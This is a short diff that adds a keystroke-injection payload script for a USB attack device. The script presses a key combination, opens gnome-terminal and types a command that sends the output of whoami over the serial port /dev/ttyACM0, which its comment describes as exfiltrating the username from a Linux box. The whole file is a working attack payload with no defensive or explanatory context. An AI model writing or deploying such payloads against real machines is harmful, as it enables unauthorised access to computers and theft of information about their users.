@@ -1,0 +1,5 @@
+Rem: Exfiltrate UserName from Linux Box using a Serial Link
+Press:134+195
+PrintLine:gnome-terminal
+CustomDelay:1000
+PrintLine:stty -F /dev/ttyACM0 38400;echo "SerialEXFIL:"$(whoami) > /dev/ttyACM0
